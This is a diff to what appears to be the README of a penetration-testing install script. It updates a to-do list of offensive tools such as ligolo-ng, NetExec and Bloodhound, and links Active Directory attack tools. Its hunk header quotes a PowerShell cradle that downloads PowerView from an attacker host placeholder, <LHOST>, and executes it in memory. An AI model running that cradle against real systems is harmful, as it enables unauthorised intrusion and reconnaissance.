@@ -63,9 +63,9 @@ IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/powerview.ps1")
 
 - [AD] https://github.com/eladshamir/Whisker
 - [AD] https://github.com/ropnop/kerbrute
-- Bloodhound to Bloodhound CE https://blog.spookysec.net//Deploying-BHCE/
-- CrackMapExec to NetExec https://github.com/Pennyw0rth/NetExec
-- Ligolo-ng as alternative to chisel https://github.com/nicocha30/ligolo-ng
+- Download windows ligolo-ng agent binary and put in /opt/win for install.sh
+- Move unused tools out of requirements_\*.txt to optional_installs
+- Switch to pipx for installing tools like bloodhound and netexec
 
 ## Checkout
 Below are things I will get around to trying and will add them to the install script if I find them useful.
